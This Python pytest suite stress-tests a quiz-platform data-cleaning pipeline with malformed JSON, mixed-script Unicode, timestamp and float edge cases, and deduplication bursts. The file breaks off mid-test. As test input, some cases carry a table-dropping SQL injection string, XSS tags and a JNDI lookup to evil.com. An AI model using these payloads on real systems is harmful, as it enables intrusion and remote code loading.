"""
Tier 5: Adversarial Data & Fuzzing Stress Test Suite.

Performs empirical stress-testing and boundary fuzzing against the Quiz Platform Data Cleaning Pipeline:
1. Deeply corrupted JSON strings (unclosed braces, truncated literals, double/triple escaped, raw controls, invalid escapes)
2. Mixed Unicode, RTL (Arabic, Hebrew), CJK, mathematical symbols, multi-byte emojis, ZWJ sequences, and XSS/SQLi payloads
3. Extreme millisecond timestamps, rollovers (1970, 2038, 9999), leap days, multi-offsets (+05:30, -04:00, +05:45, -03:30), chronological inversions
4. Floating point extremes (NaN, Inf, -Inf, subnormals, large doubles, zero total marks, division by zero)
5. Giant retry storms & deduplication invariants (100+ duplicate bursts, out-of-order arrival, deterministic tie-breaking)
6. Dirty arrays with trailing whitespace, nulls, and strict case preservation ("Option_A" vs "option_a")
7. Status enum domain normalization and quarantine routing
8. Full end-to-end multi-defect adversarial batches, Dataplex null drift (<1.0%), and 100% defect remediation verification
"""

import copy
import datetime
import json
import math
import random
from typing import Any, Dict, List, Set

try:
    import pytest
except ImportError:
    class _MockPytest:
        @staticmethod
        def fixture(*args, **kwargs):
            def decorator(f):
                return f
            return decorator
    pytest = _MockPytest()

from pipeline_engine import PipelineEngine
from synthetic_data_generator import SyntheticDataGenerator


class TestTier5Adversarial:
    """Tier 5: Adversarial Data & Fuzzing Stress Test Suite."""

    @pytest.fixture(autouse=True)
    def setup_generator(self):
        self.generator = SyntheticDataGenerator(seed=999)
        self.engine = PipelineEngine()

    def setup_method(self, method=None):
        self.generator = SyntheticDataGenerator(seed=999)
        self.engine = PipelineEngine()

    # =========================================================================
    # ADV-01: Deeply Corrupted JSON Strings & Parsing Fuzzing (20 Tests)
    # =========================================================================

    def test_adv_01_unclosed_braces(self):
        payload = '{"question": "What is Python?", "options": [{"id": "1", "text": "A"'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_02_truncated_json_string(self):
        payload = '{"user_id": "u_100", "score": 95, "details": "trun'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_03_mismatched_brackets(self):
        payload = '{"items": [1, 2, 3}}'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_04_double_escaped_json(self):
        inner = json.dumps({"topic": "Data Cleaning", "rating": 5})
        double_escaped = json.dumps(inner)
        res = self.engine.safe_parse_json(double_escaped)
        assert res is not None
        assert res.get("topic") == "Data Cleaning"
        assert res.get("rating") == 5

    def test_adv_05_triple_escaped_json(self):
        payload = '""{\\"key\\": \\"val\\"}"'
        res = self.engine.safe_parse_json(payload)
        # Should gracefully return None or parsed dict without crashing
        assert res is None or isinstance(res, dict)

    def test_adv_06_invalid_escape_sequences(self):
        payload = r'{"file_path": "C:\Windows\System32\drivers\etc\hosts", "status": "active"}'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_07_raw_control_chars_in_json(self):
        payload = '{"text": "Line 1\x00\x01\x1fLine 2"}'
        res = self.engine.safe_parse_json(payload)
        # Python json.loads without strict=False will reject raw control chars
        assert res is None or isinstance(res, dict)

    def test_adv_08_trailing_commas_in_object_and_array(self):
        payload_obj = '{"a": 1, "b": 2,}'
        payload_arr = '[1, 2, 3,]'
        assert self.engine.safe_parse_json(payload_obj) is None
        assert self.engine.safe_parse_json(payload_arr) is None

    def test_adv_09_single_quoted_json(self):
        payload = "{'key': 'value', 'count': 42}"
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_10_unquoted_keys_json(self):
        payload = '{name: "Quiz 1", active: true}'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_11_top_level_scalars_and_nulls(self):
        assert self.engine.safe_parse_json("null") is None
        assert self.engine.safe_parse_json("") is None
        assert self.engine.safe_parse_json("   ") is None
        res_num = self.engine.safe_parse_json("12345")
        assert res_num == 12345
        res_bool = self.engine.safe_parse_json("true")
        assert res_bool is True

    def test_adv_12_utf16_surrogate_pairs(self):
        payload = '{"emoji": "\\ud83d\\ude00", "math": "\\u221e"}'
        res = self.engine.safe_parse_json(payload)
        assert res is not None
        assert res["emoji"] == "😀"
        assert res["math"] == "∞"

    def test_adv_13_json_with_comments(self):
        payload = '{\n  // comment line\n  "name": "Math Quiz"\n}'
        res = self.engine.safe_parse_json(payload)
        assert res is None

    def test_adv_14_massive_json_payload_10k_keys(self):
        huge_dict = {f"k_{i}": i for i in range(10000)}
        payload = json.dumps(huge_dict)
        res = self.engine.safe_parse_json(payload)
        assert res is not None
        assert len(res) == 10000
        assert res["k_9999"] == 9999

    def test_adv_15_deeply_nested_json_100_levels(self):
        nested = {"level": 100}
        for i in range(99, 0, -1):
            nested = {"level": i, "child": nested}
        payload = json.dumps(nested)
        res = self.engine.safe_parse_json(payload)
        assert res is not None
        assert res["level"] == 1
        assert res["child"]["level"] == 2

    def test_adv_16_json_value_non_existent_paths(self):
        obj = {"a": {"b": {"c": "found"}}}
        assert self.engine.json_value(obj, "$.a.b.c") == "found"
        assert self.engine.json_value(obj, "$.a.b.missing") is None
        assert self.engine.json_value(obj, "$.x.y.z") is None
        assert self.engine.json_value(None, "$.a") is None

    def test_adv_17_json_value_on_arrays_and_objects(self):
        obj = {"nested_obj": {"x": 1}, "nested_arr": [1, 2, 3], "scalar": 42}
        # BigQuery JSON_VALUE returns NULL for JSON arrays and objects
        assert self.engine.json_value(obj, "$.nested_obj") is None
        assert self.engine.json_value(obj, "$.nested_arr") is None
        assert self.engine.json_value(obj, "$.scalar") == "42"

    def test_adv_18_json_query_array_on_non_arrays(self):
        obj = {"name": "Quiz", "count": 10, "items": ["a", "b"]}
        assert self.engine.json_query_array(obj, "$.name") is None
        assert self.engine.json_query_array(obj, "$.count") is None
        assert self.engine.json_query_array(obj, "$.items") == ["a", "b"]

    def test_adv_19_json_query_nested_subobjects(self):
        obj = {"metadata": {"author": "Alice", "tags": ["math", "logic"]}}
        sub = self.engine.json_query(obj, "$.metadata")
        assert isinstance(sub, dict)
        assert sub["author"] == "Alice"

    def test_adv_20_safe_parse_json_non_string_types(self):
        assert self.engine.safe_parse_json(None) is None
        assert self.engine.safe_parse_json(123) is None
        assert self.engine.safe_parse_json(45.67) is None
        assert self.engine.safe_parse_json(True) is None
        assert self.engine.safe_parse_json(["already", "list"]) == ["already", "list"]
        assert self.engine.safe_parse_json({"already": "dict"}) == {"already": "dict"}

    # =========================================================================
    # ADV-02: Mixed Unicode, RTL, Emojis, and Script Diversity (15 Tests)
    # =========================================================================

    def test_adv_21_mixed_arabic_english_rtl(self):
        text = "الرياضيات Mathematics - فصل 1"
        arr = [text, f"  {text}  "]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 1
        assert cleaned[0] == text

    def test_adv_22_mixed_hebrew_english_rtl(self):
        text = "מבחן במתמטיקה Quiz #10"
        arr = [text, "Other"]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 2
        assert cleaned[0] == text

    def test_adv_23_cjk_characters_fullwidth_punctuation(self):
        cjk_text = "２０２６年 퀴즈 플랫폼 - クイズ（第１問）"
        arr = [f"  {cjk_text}  ", cjk_text]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 1
        assert cleaned[0] == cjk_text

    def test_adv_24_mathematical_symbols_and_greek_alphabet(self):
        math_text = "∀x ∈ ℝ: ∫(x² + √y) dx = α + β·γ ± ε"
        arr = [math_text]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == math_text

    def test_adv_25_multibyte_emojis_and_zwj_sequences(self):
        emoji_seq = "👨‍👩‍👧‍👦 🚀 🔥 💯 🧑‍💻 🧙‍♂️"
        arr = [f"  {emoji_seq}  ", emoji_seq, "🔥"]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 2
        assert cleaned[0] == emoji_seq
        assert cleaned[1] == "🔥"

    def test_adv_26_zero_width_spaces_and_joiners(self):
        zw_text = "hello\u200bworld\u200c\u200dtest"
        arr = [zw_text, f" {zw_text} "]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 1
        assert cleaned[0] == zw_text

    def test_adv_27_combining_diacritics_and_accents(self):
        accent_text = "Café façade naïve résumé crème brûlée"
        arr = [accent_text]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == accent_text

    def test_adv_28_sql_injection_payload_in_text_fields(self):
        sqli = "'; DROP TABLE fct_assessment_attempts; -- ' OR '1'='1"
        arr = [sqli]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == sqli

    def test_adv_29_xss_and_html_tags_in_text_fields(self):
        xss = "<script>alert('xss')</script><img src=x onerror=alert(1)>"
        arr = [f"  {xss}  "]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == xss

    def test_adv_30_format_string_and_template_injection_syntax(self):
        payload = "%s %d %x ${jndi:ldap://evil.com/a} {{7*7}} <%= 7*7 %>"
        arr = [payload]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == payload

    def test_adv_31_german_sharp_s_and_turkish_dotted_i(self):
        text_de = "Straße Maß"
        text_tr = "İstanbul ılık"
        arr = [text_de, text_tr]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned[0] == text_de
        assert cleaned[1] == text_tr

    def test_adv_32_unicode_whitespace_variants(self):
        # Non-breaking space, em-space, thin space
        text = "\u00a0Option_A\u2003\u2009"
        cleaned = self.engine.sanitize_array([text])
        assert len(cleaned) == 1
        assert cleaned[0] == "Option_A"

    def test_adv_33_surrogate_pairs_and_astral_planes(self):
        astral = "𝕸𝖆𝖙𝖍 𝒬𝓊𝒾𝓏 🀄 🂡 𝄞"
        cleaned = self.engine.sanitize_array([astral])
        assert cleaned[0] == astral

    def test_adv_34_long_unicode_strings_50k_chars(self):
        long_str = "ユニコード" * 10000
        cleaned = self.engine.sanitize_array([long_str])
        assert len(cleaned) == 1
        assert len(cleaned[0]) == 50000

    def test_adv_35_control_character_stripping_and_sanitization(self):
        ctrl = "\t\n  Cleaned Option  \r\n"
        cleaned = self.engine.sanitize_array([ctrl])
        assert cleaned == ["Cleaned Option"]

    # =========================================================================
    # ADV-03: Extreme Millisecond Timestamps, Rollovers, and Offsets (20 Tests)
    # =========================================================================

    def test_adv_36_epoch_zero_1970(self):
        assert self.engine.parse_timestamp_utc(0) == "1970-01-01T00:00:00Z"
        assert self.engine.parse_timestamp_utc("0") == "1970-01-01T00:00:00Z"

    def test_adv_37_epoch_milliseconds_standard(self):
        # 1724000000000 ms -> 2024-08-18T16:53:20Z
        res = self.engine.parse_timestamp_utc(1724000000000)
        assert res == "2024-08-18T16:53:20Z"
        res_str = self.engine.parse_timestamp_utc("1724000000000")
        assert res_str == "2024-08-18T16:53:20Z"

    def test_adv_38_epoch_milliseconds_high_year_9999(self):
        # 253402300799 is 9999-12-31T23:59:59Z
        res = self.engine.parse_timestamp_utc(253402300799)
        assert res == "9999-12-31T23:59:59Z"

    def test_adv_39_epoch_seconds_standard(self):
        res = self.engine.parse_timestamp_utc(1724000000)
        assert res == "2024-08-18T16:53:20Z"

    def test_adv_40_year_2038_32bit_rollover(self):
        # 2147483647 is 2038-01-19T03:14:07Z
        assert self.engine.parse_timestamp_utc(2147483647) == "2038-01-19T03:14:07Z"
        # 2147483648 is 2038-01-19T03:14:08Z
        assert self.engine.parse_timestamp_utc(2147483648) == "2038-01-19T03:14:08Z"

    def test_adv_41_negative_epoch_timestamps(self):
        assert self.engine.parse_timestamp_utc(-1) is None
        assert self.engine.parse_timestamp_utc(-1000000) is None

    def test_adv_42_leap_day_valid_2024(self):
        res = self.engine.parse_timestamp_utc("2024-02-29T23:59:59Z")
        assert res == "2024-02-29T23:59:59Z"

    def test_adv_43_leap_day_invalid_2025(self):
        res = self.engine.parse_timestamp_utc("2025-02-29T00:00:00Z")
        assert res is None

    def test_adv_44_leap_day_century_year_2000_and_2100(self):
        assert self.engine.parse_timestamp_utc("2000-02-29T12:00:00Z") == "2000-02-29T12:00:00Z"
        assert self.engine.parse_timestamp_utc("2100-02-29T12:00:00Z") is None

    def test_adv_45_timezone_offset_ist_plus_0530(self):
        res = self.engine.parse_timestamp_utc("2026-08-18T21:08:27+05:30")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_46_timezone_offset_edt_minus_0400(self):
        res = self.engine.parse_timestamp_utc("2026-08-18T11:38:27-04:00")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_47_timezone_offset_nepal_plus_0545(self):
        res = self.engine.parse_timestamp_utc("2026-08-18T21:23:27+05:45")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_48_timezone_offset_newfoundland_minus_0330(self):
        res = self.engine.parse_timestamp_utc("2026-08-18T12:08:27-03:30")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_49_timezone_offset_chatham_plus_1245(self):
        res = self.engine.parse_timestamp_utc("2026-08-19T04:23:27+12:45")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_50_fractional_seconds_microseconds(self):
        res = self.engine.parse_timestamp_utc("2026-08-18T15:38:27.999999Z")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_51_space_separated_sql_timestamp_formats(self):
        res = self.engine.parse_timestamp_utc("2026-08-18 15:38:27")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_52_slash_separated_date_formats(self):
        res = self.engine.parse_timestamp_utc("2026/08/18 15:38:27")
        assert res == "2026-08-18T15:38:27Z"

    def test_adv_53_date_only_format_without_time(self):
        res = self.engine.parse_timestamp_utc("2026-08-18")
        assert res == "2026-08-18T00:00:00Z"

    def test_adv_54_chronological_inversion_duration_zero(self):
        # started at 15:00, submitted at 14:00
        raw_attempts = [{
            "id": "att_inv_1",
            "user_id": "u_1",
            "started_at": "2026-08-18T15:00:00Z",
            "submitted_at": "2026-08-18T14:00:00Z",
            "score": 50.0,
            "total_marks": 100.0,
            "status": "COMPLETED"
        }]
        stg = self.engine.clean_bronze_to_silver({"assessment_attempts": raw_attempts})
        att = stg["stg_assessment_attempts"][0]
        assert att["duration_seconds"] == 0

    def test_adv_55_monotonic_assertion_flags_inversion(self):
        records = [{
            "attempt_id": "att_inv_1",
            "started_at_utc": "2026-08-18T15:00:00Z",
            "submitted_at_utc": "2026-08-18T14:00:00Z"
        }]
        res = self.engine.assert_timestamps_monotonic(records, "started_at_utc", "submitted_at_utc")
        assert res["passed"] is False
        assert res["violations_count"] == 1

    # =========================================================================
    # ADV-04: Floating Point Extremes, NaN/Inf, Zero Total Marks (15 Tests)
    # =========================================================================

    def test_adv_56_nan_score_numeric(self):
        score, pct, dur = self.engine.clamp_score(float("nan"), 100.0, 60)
        assert not math.isnan(score)
        assert not math.isnan(pct)
        assert 0.0 <= pct <= 100.0
        assert score >= 0.0

    def test_adv_57_nan_score_string(self):
        score, pct, dur = self.engine.clamp_score("NaN", 100.0, 60)
        assert not math.isnan(score)
        assert not math.isnan(pct)
        assert 0.0 <= pct <= 100.0

    def test_adv_58_inf_score_numeric(self):
        score, pct, dur = self.engine.clamp_score(float("inf"), 100.0, 60)
        assert not math.isinf(pct)
        assert pct <= 100.0

    def test_adv_59_inf_score_string(self):
        score, pct, dur = self.engine.clamp_score("Infinity", 100.0, 60)
        assert pct <= 100.0

    def test_adv_60_negative_inf_score(self):
        score, pct, dur = self.engine.clamp_score(float("-inf"), 100.0, 60)
        assert score == 0.0
        assert pct == 0.0

    def test_adv_61_zero_total_marks_numeric(self):
        score, pct, dur = self.engine.clamp_score(50.0, 0.0, 60)
        assert pct == 0.0
        assert score == 50.0

    def test_adv_62_zero_total_marks_string(self):
        score, pct, dur = self.engine.clamp_score("50.0", "0", 60)
        assert pct == 0.0

    def test_adv_63_negative_total_marks(self):
        score, pct, dur = self.engine.clamp_score(50.0, -100.0, 60)
        assert pct == 0.0

    def test_adv_64_negative_obtained_marks(self):
        score, pct, dur = self.engine.clamp_score(-75.5, 100.0, 60)
        assert score == 0.0
        assert pct == 0.0

    def test_adv_65_obtained_marks_exceeding_total_marks(self):
        score, pct, dur = self.engine.clamp_score(150.0, 100.0, 60)
        assert score == 150.0
        assert pct == 100.0

    def test_adv_66_subnormal_floating_point_score(self):
        score, pct, dur = self.engine.clamp_score(1e-300, 100.0, 60)
        assert score >= 0.0
        assert pct >= 0.0

    def test_adv_67_large_double_precision_score(self):
        score, pct, dur = self.engine.clamp_score(1e10, 1e10, 60)
        assert pct == 100.0

    def test_adv_68_garbage_string_in_numeric_columns(self):
        score, pct, dur = self.engine.clamp_score("not_a_score", "not_total", "invalid_dur")
        assert score == 0.0
        assert pct == 0.0
        assert dur == 0

    def test_adv_69_boolean_in_numeric_columns(self):
        score, pct, dur = self.engine.clamp_score(True, False, None)
        assert score >= 0.0
        assert pct == 0.0

    def test_adv_70_score_assertion_passes_after_clamping(self):
        records = [
            {"attempt_id": "att_1", "percentage": 0.0, "score": 0.0, "duration_seconds": 0},
            {"attempt_id": "att_2", "percentage": 100.0, "score": 100.0, "duration_seconds": 3600},
            {"attempt_id": "att_3", "percentage": 75.5, "score": 75.5, "duration_seconds": 120}
        ]
        res_pct = self.engine.assert_numeric_range(records, "percentage", 0.0, 100.0)
        res_scr = self.engine.assert_numeric_range(records, "score", 0.0, None)
        assert res_pct["passed"] is True
        assert res_scr["passed"] is True

    # =========================================================================
    # ADV-05: Giant Retry Storms & Deduplication Invariants (10 Tests)
    # =========================================================================

    def test_adv_71_burst_100_identical_records(self):
        records = [{
            "id": "burst_id_1",
            "score": 50,
            "updated_at": "2026-08-18T15:00:00Z"
        } for _ in range(100)]
        deduped = self.engine.deduplicate_records(records, pk_field="id")
        assert len(deduped) == 1
        assert deduped[0]["id"] == "burst_id_1"

    def test_adv_72_burst_100_incrementing_timestamps(self):
        records = []
        for i in range(100):
            records.append({
                "id": "burst_id_2",
                "score": i,
                "updated_at": f"2026-08-18T15:00:{i:02d}Z" if i < 60 else f"2026-08-18T15:01:{i-60:02d}Z"
            })
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert len(deduped) == 1
        assert deduped[0]["score"] == 99

    def test_adv_73_burst_100_reverse_chronological_order(self):
        records = []
        for i in range(99, -1, -1):
            records.append({
                "id": "burst_id_3",
                "score": i,
                "updated_at": f"2026-08-18T15:00:{i:02d}Z" if i < 60 else f"2026-08-18T15:01:{i-60:02d}Z"
            })
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert len(deduped) == 1
        assert deduped[0]["score"] == 99

    def test_adv_74_burst_100_random_shuffled_order(self):
        records = []
        for i in range(100):
            records.append({
                "id": "burst_id_4",
                "score": i,
                "updated_at": f"2026-08-18T15:00:{i:02d}Z" if i < 60 else f"2026-08-18T15:01:{i-60:02d}Z"
            })
        rng = random.Random(42)
        rng.shuffle(records)
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert len(deduped) == 1
        assert deduped[0]["score"] == 99

    def test_adv_75_timestamp_tie_breaking_deterministic(self):
        records = [
            {"id": "tie_1", "version": "v1", "updated_at": "2026-08-18T15:00:00Z"},
            {"id": "tie_1", "version": "v2", "updated_at": "2026-08-18T15:00:00Z"},
            {"id": "tie_1", "version": "v3", "updated_at": "2026-08-18T15:00:00Z"}
        ]
        deduped1 = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at", "version"])
        deduped2 = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at", "version"])
        assert len(deduped1) == 1
        assert deduped1[0]["version"] == "v3"
        assert deduped1 == deduped2

    def test_adv_76_multi_pk_retry_storm_1000_records_50_groups(self):
        records = []
        for g in range(50):
            for r in range(20):
                records.append({
                    "id": f"group_{g}",
                    "seq": r,
                    "updated_at": f"2026-08-18T15:{g:02d}:{r:02d}Z"
                })
        rng = random.Random(123)
        rng.shuffle(records)
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert len(deduped) == 50
        for row in deduped:
            assert row["seq"] == 19

    def test_adv_77_retry_storm_with_missing_timestamps(self):
        records = [
            {"id": "rec_none_ts", "val": 1, "updated_at": None},
            {"id": "rec_none_ts", "val": 2, "updated_at": "2026-08-18T15:00:00Z"},
            {"id": "rec_none_ts", "val": 3, "updated_at": None}
        ]
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert len(deduped) == 1
        assert deduped[0]["val"] == 2

    def test_adv_78_retry_storm_with_mixed_valid_invalid_payloads(self):
        records = [
            {"id": "rec_mixed", "status": "IN_PROGRESS", "updated_at": "2026-08-18T15:00:00Z"},
            {"id": "rec_mixed", "status": "COMPLETED", "updated_at": "2026-08-18T15:30:00Z"}
        ]
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert deduped[0]["status"] == "COMPLETED"

    def test_adv_79_idempotency_double_deduplication(self):
        records = [{"id": f"id_{i % 10}", "val": i, "updated_at": f"2026-08-18T15:00:{i:02d}Z"} for i in range(100)]
        pass1 = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        pass2 = self.engine.deduplicate_records(pass1, pk_field="id", order_by_fields=["updated_at"])
        assert len(pass1) == 10
        assert pass1 == pass2

    def test_adv_80_deduplication_preserves_latest_status(self):
        records = [
            {"id": "att_stat_1", "status": "CREATED", "updated_at": "2026-08-18T15:00:00Z"},
            {"id": "att_stat_1", "status": "IN_PROGRESS", "updated_at": "2026-08-18T15:10:00Z"},
            {"id": "att_stat_1", "status": "COMPLETED", "updated_at": "2026-08-18T15:30:00Z"}
        ]
        deduped = self.engine.deduplicate_records(records, pk_field="id", order_by_fields=["updated_at"])
        assert deduped[0]["status"] == "COMPLETED"

    # =========================================================================
    # ADV-06: Dirty Arrays, Nulls, Whitespace, & Case Preservation (10 Tests)
    # =========================================================================

    def test_adv_81_array_pure_nulls(self):
        arr = [None, None, None, None]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned == []

    def test_adv_82_array_pure_whitespace_elements(self):
        arr = ["  ", "\t", "\n\r", "   \t\n  "]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned == []

    def test_adv_83_array_mixed_casing_preservation(self):
        # Case preservation invariant: distinct casings must NOT be collapsed
        arr = ["Option_A", "option_a", "OPTION_A", "OpTiOn_A"]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 4
        assert cleaned == ["Option_A", "option_a", "OPTION_A", "OpTiOn_A"]

    def test_adv_84_array_duplicate_with_leading_trailing_whitespace(self):
        arr = ["  Apple  ", "Apple", "apple", "  apple\t", "APPLE"]
        cleaned = self.engine.sanitize_array(arr)
        # "Apple" (from trimmed 1st), "apple" (from 3rd), "APPLE" (from 5th)
        assert len(cleaned) == 3
        assert cleaned == ["Apple", "apple", "APPLE"]

    def test_adv_85_array_non_string_types_coercion(self):
        arr = [1, 2.5, True, False, None, {"id": 1}]
        cleaned = self.engine.sanitize_array(arr)
        assert "1" in cleaned
        assert "2.5" in cleaned
        assert "True" in cleaned
        assert "False" in cleaned

    def test_adv_86_array_unicode_and_emojis(self):
        arr = ["  🚀 Launch  ", "🚀 Launch", "🔥 Fire", None]
        cleaned = self.engine.sanitize_array(arr)
        assert cleaned == ["🚀 Launch", "🔥 Fire"]

    def test_adv_87_array_huge_10000_elements(self):
        arr = [f"  Option_{i % 100}  " for i in range(10000)]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 100
        assert cleaned[0] == "Option_0"
        assert cleaned[99] == "Option_99"

    def test_adv_88_array_nested_lists_handling(self):
        arr = [["nested", "item"], None, "direct_item"]
        cleaned = self.engine.sanitize_array(arr)
        assert len(cleaned) == 2

    def test_adv_89_array_assertion_validity_on_clean_array(self):
        records = [
            {"response_id": "r_1", "selected_option_ids": ["opt_1", "opt_2"]},
            {"response_id": "r_2", "selected_option_ids": []}
        ]
        res = self.engine.assert_array_validity(records, "selected_option_ids")
        assert res["passed"] is True
        assert res["violations_count"] == 0

    def test_adv_90_array_assertion_catches_dirty_array(self):
        records = [
            {"response_id": "r_1", "selected_option_ids": ["opt_1", None, "  untrimmed  "]}
        ]
        res = self.engine.assert_array_validity(records, "selected_option_ids")
        assert res["passed"] is False
        assert res["violations_count"] == 2

    # =========================================================================
    # ADV-07: Status Enum Normalization & Boundary Fuzzing (7 Tests)
    # =========================================================================

    def test_adv_91_status_enum_lowercase_trimmed(self):
        assert self.engine.normalize_status_enum("completed") == "COMPLETED"
        assert self.engine.normalize_status_enum("  in_progress  ") == "IN_PROGRESS"
        assert self.engine.normalize_status_enum("submitting") == "SUBMITTING"

    def test_adv_92_status_enum_mixed_case_with_spaces(self):
        assert self.engine.normalize_status_enum("  AbAnDoNeD  ") == "ABANDONED"
        assert self.engine.normalize_status_enum("\tExPiReD\n") == "EXPIRED"

    def test_adv_93_status_enum_all_7_valid_values(self):
        valid_set = {"CREATED", "IN_PROGRESS", "SUBMITTING", "COMPLETED", "EXPIRED", "CANCELLED", "ABANDONED"}
        for s in valid_set:
            assert self.engine.normalize_status_enum(s.lower()) == s

    def test_adv_94_status_enum_invalid_strings_fallback_unknown(self):
        assert self.engine.normalize_status_enum("HACKED") == "UNKNOWN"
        assert self.engine.normalize_status_enum("DELETED") == "UNKNOWN"
        assert self.engine.normalize_status_enum("PENDING") == "UNKNOWN"

    def test_adv_95_status_enum_empty_string_and_none(self):
        assert self.engine.normalize_status_enum(None) == "UNKNOWN"
        assert self.engine.normalize_status_enum("") == "UNKNOWN"
        assert self.engine.normalize_status_enum("   ") == "UNKNOWN"

    def test_adv_96_status_enum_numeric_and_special_chars(self):
        assert self.engine.normalize_status_enum(12345) == "UNKNOWN"
        assert self.engine.normalize_status_enum("!@#$%^&*()") == "UNKNOWN"

    def test_adv_97_status_enum_quarantine_routing_on_unknown(self):
        raw = {
            "users": [{"id": "u_valid", "name": "Valid User"}],
            "assessment_attempts": [
                {"id": "att_ok", "user_id": "u_valid", "status": "COMPLETED", "score": 80, "total_marks": 100},
                {"id": "att_bad_enum", "user_id": "u_valid", "status": "HACKED_STATE", "score": 80, "total_marks": 100}
            ]
        }
        res = self.engine.run_full_pipeline(raw)
        gold_attempts = res["gold"]["fct_assessment_attempts"]
        quarantine_attempts = res["quarantine"]["quarantine_orphaned_attempts"]
        assert len(gold_attempts) == 1
        assert gold_attempts[0]["attempt_id"] == "att_ok"
        assert len(quarantine_attempts) == 1
        assert quarantine_attempts[0]["attempt_id"] == "att_bad_enum"

    # =========================================================================
    # ADV-08: Complex Cross-Defect Malicious End-to-End Workloads (8 Tests)
    # =========================================================================

    def test_adv_98_full_pipeline_multi_defect_adversarial_batch(self):
        """
        Adversarial multi-defect batch:
        - 5 valid users, 1 invalid orphan attempt
        - Corrupted JSON question snapshots
        - Mixed unicode options with RTL and Emojis
        - Multi-offset timestamps (+05:30, -04:00, epoch_ms)
        - Extreme NaN / Inf / -Inf scores and 0 total marks
        - 50 duplicate retry bursts
        - Dirty option arrays with nulls and whitespace
        """
        raw_data = {
            "users": [{"id": f"u_{i}", "name": f"User {i}"} for i in range(5)],
            "quizzes": [{"id": "q_1", "title": "Adversarial Quiz"}],
            "assessment_attempts": [],
            "attempt_questions": [],
            "answers": [],
            "audit_logs": [],
            "certificates": []
        }

        # 1. Inject 50 valid attempts + 10 orphaned attempts
        for i in range(50):
            user_id = f"u_{i % 5}"
            raw_data["assessment_attempts"].append({
                "id": f"att_{i}",
                "user_id": user_id,
                "quiz_version_id": "qv_1",
                "status": "completed " if i % 2 == 0 else "IN_PROGRESS",
                "started_at": "2026-08-18T21:08:27+05:30",
                "submitted_at": "2026-08-18T16:00:00Z",
                "score": float("nan") if i == 0 else (150.0 if i == 1 else (i * 2)),
                "total_marks": 0.0 if i == 2 else 100.0,
                "passed": True if (i * 2 >= 60) else False,
                "updated_at": "2026-08-18T16:00:00Z"
            })
            # Add 2 retry burst duplicates for each
            raw_data["assessment_attempts"].append({
                "id": f"att_{i}",
                "user_id": user_id,
                "quiz_version_id": "qv_1",
                "status": "COMPLETED",
                "started_at": "2026-08-18T21:08:27+05:30",
                "submitted_at": "2026-08-18T16:00:00Z",
                "score": i * 2,
                "total_marks": 100.0,
                "passed": True if (i * 2 >= 60) else False,
                "updated_at": "2026-08-18T16:05:00Z"
            })

        # 10 orphaned attempts
        for i in range(10):
            raw_data["assessment_attempts"].append({
                "id": f"att_orphan_{i}",
                "user_id": "u_non_existent_orphan",
                "status": "COMPLETED",
                "score": 80,
                "total_marks": 100,
                "updated_at": "2026-08-18T16:00:00Z"
            })

        # 2. Inject answers with dirty arrays and mixed unicode
        for i in range(50):
            raw_data["answers"].append({
                "id": f"ans_{i}",
                "attempt_id": f"att_{i}",
                "question_id": "q_1",
                "selected_option_ids": [f"  Option_{i % 4}  ", None, "Option_A", "option_a", "🚀 Rocket"],
                "text_response": "الرياضيات CJK クイズ",
                "is_correct": True,
                "marks_awarded": -10 if i == 0 else 5.0,
                "time_spent_seconds": -5 if i == 0 else 30
            })

        # Run pipeline
        res = self.engine.run_full_pipeline(raw_data)
        gold = res["gold"]
        quarantine = res["quarantine"]

        # Assertions
        assert len(gold["fct_assessment_attempts"]) == 50
        assert len(quarantine["quarantine_orphaned_attempts"]) == 10
        assert len(gold["fct_question_responses"]) == 50

    def test_adv_99_all_assertions_pass_on_adversarial_output(self):
        raw_data = {
            "users": [{"id": "u_1", "name": "Alice"}],
            "assessment_attempts": [
                {
                    "id": "att_1",
                    "user_id": "u_1",
                    "status": "completed",
                    "started_at": "2026-08-18T15:00:00Z",
                    "submitted_at": "2026-08-18T15:30:00Z",
                    "score": "NaN",
                    "total_marks": "0.0",
                    "passed": False
                }
            ],
            "answers": [
                {
                    "id": "ans_1",
                    "attempt_id": "att_1",
                    "question_id": "q_1",
